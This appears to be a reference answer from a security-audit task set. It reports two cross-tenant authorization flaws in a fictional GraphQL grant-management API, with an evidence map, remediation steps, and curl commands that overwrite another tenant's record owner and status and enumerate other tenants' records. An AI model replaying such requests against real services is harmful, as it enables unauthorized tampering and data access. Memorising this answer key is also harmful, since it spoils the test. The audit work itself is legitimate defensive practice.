# Expected Response

## System
- **Name:** GrantFlow CRM API
- **Domain:** Non-Profit / Grant Management
- **Example ID:** GQL-0027
- **Architecture:** REST + Salesforce + GraphQL

---

## Priority Findings

### Finding 1 — GraphQL Write BOLA: Cross-Tenant State Mutation via `updateResource` (Pattern 1.6 — Write operations without ownership check)
**Severity:** Critical
**Affected endpoint:** `POST https://api.grantflow-crm-api.example.com/graphql` (mutation `updateResource`)
**Referenced in context:** Section 4.0 (RISK-GQL-027), Section 5.0 (Pattern 1.6 description), HAR trace

**Summary:**
The `updateResource` mutation (Section 5.0) accepts an arbitrary `resourceId` parameter without verifying that the requesting user owns the object. An authenticated user from `tenant-5589` can submit a mutation targeting resource `R-2027`, which belongs to `tenant-13bd`, and the mutation executes successfully — allowing cross-tenant state corruption.

Section 4.0 (RISK-GQL-027) confirms the root cause: the resolver fetches by `resourceId` only and never verifies the object's `tenantId` against the JWT's `tenantId` claim.

**Evidence from HAR:**
- Request header `x-tenant-id: tenant-5589` — attacker's tenant
- Request mutation: `updateResource(id: "R-2027", input: {status: "approved", ownerId: "attacker-558913bd"})` — `R-2027` belongs to `tenant-13bd`
- The mutation input overrides `status` to `"approved"` and `ownerId` to an attacker-controlled value
- Response: `200 OK`, `x-request-id: req-558913bd`
- Response body: `tenantId: "tenant-13bd"`, `ownerId: "other-user-558913bd"` — cross-tenant mutation was accepted and executed

---

### Finding 2 — GraphQL BOLA: `bulkResourceLookup` Lacks Per-ID Ownership Filter
**Severity:** Critical / Cross-Tenant Mass Access
**Affected endpoint:** `POST https://api.grantflow-crm-api.example.com/graphql` (mutation `bulkResourceLookup`)
**Referenced in context:** Section 4.0 ("The `bulkResourceLookup` mutation accepts an arbitrary array of IDs without per-ID ownership filtering")

**Summary:**
As explicitly documented in Section 4.0, `bulkResourceLookup` processes all supplied IDs without filtering by the JWT's `tenantId`. This allows a single mutation to read or correlate data from multiple tenants simultaneously.

---

## Evidence Map

| Artifact location | Finding 1 (Write BOLA) | Finding 2 (Bulk BOLA) |
|---|---|---|
| Section 4.0 / RISK-GQL-027 | Resolver fetches by `resourceId` only; no `tenantId` check | bulkResourceLookup lacks per-ID filter |
| Section 5.0 | Pattern 1.6 — write without ownership check; attacker changes `status` and `ownerId` | — |
| HAR x-tenant-id | `tenant-5589` (attacker) | — |
| HAR mutation | `updateResource(id: "R-2027", input: {status: "approved", ownerId: "attacker-558913bd"})` | — |
| HAR response tenantId | `tenant-13bd` — object belonged to different tenant | — |
| HAR response HTTP | `200 OK` — mutation accepted without error | — |

---

## Steps to Reproduce

### Finding 1 — Write BOLA via `updateResource`

**Step 1 — Establish attacker baseline (own tenant)**
```bash
curl -s -X POST https://api.grantflow-crm-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-5589" \
  -d '{"query": "mutation { updateResource(id: \"R-1027\", input: {status: \"approved\"}) { resourceId tenantId status } }"}'
```
**Expected baseline:** Mutation returns `tenantId: "tenant-5589"` — attacker modified their own object.

**Step 2 — Cross-tenant write mutation (exact HAR replay)**
```bash
curl -s -X POST https://api.grantflow-crm-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-5589" \
  -d '{"query": "query VulnerableOp { updateResource(id: \"R-2027\", input: {status: \"approved\", ownerId: \"attacker-558913bd\"}) { resourceId status } }"}'
```
**Vulnerable outcome (confirmed by HAR):**
- Response: `200 OK`
- Response body includes `tenantId: "tenant-13bd"` — the mutation was accepted and executed against a resource belonging to a different tenant
- Response `x-request-id: req-558913bd` ties the request to both tenant IDs
- `status` was changed to `"approved"` for the victim tenant's grant record without authorization
- `ownerId` was overwritten to `"attacker-558913bd"` — the attacker claimed ownership of a cross-tenant object

**Secure outcome:**
```json
{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": { "updateResource": null } }
```

### Finding 2 — Bulk cross-tenant enumeration

**Step 3 — `bulkResourceLookup` without tenant filtering**
```bash
curl -s -X POST https://api.grantflow-crm-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-5589" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2027\", \"R-3027\", \"R-4027\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome (per Section 4.0):** Returns objects with `tenantId` values other than `"tenant-5589"`, confirming cross-tenant enumeration in a single request.
**Secure outcome:** Only returns objects where `tenantId = "tenant-5589"`; all cross-tenant IDs are filtered or return null.

---

## Remediation

1. **Resolver-level tenant check for writes (Finding 1):** Before executing `updateResource`, verify `WHERE resource_id = $id AND tenant_id = $jwtTenantId`. If the object's `tenantId` does not match the JWT's `tenantId`, return `403 Forbidden` before any mutation executes.

2. **Block `ownerId` override by clients:** The `ResourceInput` type must not accept `ownerId` as a writable field from the client — ownership must be a server-side invariant only changeable via an admin-scoped operation.

3. **Bulk operation tenant filter (Finding 2):** Add `WHERE resource_id = ANY($ids) AND tenant_id = $jwtTenantId` in `bulkResourceLookup` — return only the caller's own objects.
